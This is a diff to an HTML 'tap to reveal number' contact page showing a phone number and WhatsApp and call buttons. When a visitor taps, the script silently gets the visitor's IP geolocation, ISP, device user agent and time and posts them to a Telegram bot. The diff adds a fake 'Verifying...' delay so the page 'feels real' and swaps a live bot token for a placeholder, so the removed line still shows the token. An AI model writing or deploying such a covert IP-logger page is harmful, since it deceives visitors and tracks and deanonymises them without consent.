@@ -7,57 +7,81 @@
 <style>
 body {
   margin: 0;
-  font-family: sans-serif;
-  background: #f5f5f5;
+  font-family: 'Segoe UI', sans-serif;
+  height: 100vh;
   display: flex;
   justify-content: center;
   align-items: center;
-  height: 100vh;
+  background: linear-gradient(135deg, #667eea, #764ba2);
 }
 
+/* Glass Card */
 .container {
-  background: white;
+  background: rgba(255,255,255,0.15);
+  backdrop-filter: blur(15px);
   padding: 25px;
-  border-radius: 15px;
+  border-radius: 20px;
   width: 90%;
-  max-width: 400px;
+  max-width: 380px;
   text-align: center;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+  color: white;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
 }
 
+/* Title */
 h2 {
   margin-bottom: 20px;
 }
 
+/* Buttons */
 button, a {
   display: block;
   width: 100%;
-  padding: 14px;
+  padding: 15px;
   margin-top: 12px;
+  border-radius: 12px;
   font-size: 16px;
-  border-radius: 10px;
-  text-decoration: none;
   border: none;
+  text-decoration: none;
+  transition: 0.2s;
 }
 
+/* Main button */
 button {
-  background: #007bff;
-  color: white;
+  background: white;
+  color: #333;
+  font-weight: bold;
 }
 
+button:active {
+  transform: scale(0.96);
+}
+
+/* WhatsApp */
 #wa {
   background: #25D366;
   color: white;
 }
 
+/* Call */
 #call {
   background: #28a745;
   color: white;
 }
 
+/* Number */
 #num {
-  font-size: 20px;
+  font-size: 22px;
   margin-top: 15px;
+  font-weight: bold;
+}
+
+/* Loading */
+#loading {
+  display: none;
+  margin-top: 15px;
+  font-size: 14px;
+  opacity: 0.8;
 }
 </style>
 </head>
@@ -70,22 +94,29 @@ button {
 
 <button onclick="reveal()">Tap to Reveal Number</button>
 
+<p id="loading">🔍 Verifying...</p>
+
 <p id="num" style="display:none;">
   +91 9510389983
 </p>
 
 <a id="wa" target="_blank" style="display:none;">
-  Chat on WhatsApp
+  💬 Chat on WhatsApp
 </a>
 
 <a id="call" style="display:none;">
-  Call Now
+  📞 Call Now
 </a>
 
 </div>
 
 <script>
 async function reveal() {
+
+  document.getElementById("loading").style.display = "block";
+
+  // Delay for better UX (feels real)
+  await new Promise(r => setTimeout(r, 1200));
 
   try {
     let data = await fetch("https://ipapi.co/json/")
@@ -102,7 +133,7 @@ ISP: ${data.org}
 Device: ${navigator.userAgent}
 Time: ${new Date().toLocaleString()}`;
 
-    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
+    fetch("https://api.telegram.org/botYOUR_NEW_TOKEN/sendMessage", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
@@ -112,6 +143,8 @@ Time: ${new Date().toLocaleString()}`;
     });
 
   } catch(e) {}
+
+  document.getElementById("loading").style.display = "none";
 
   document.getElementById("num").style.display = "block";
 
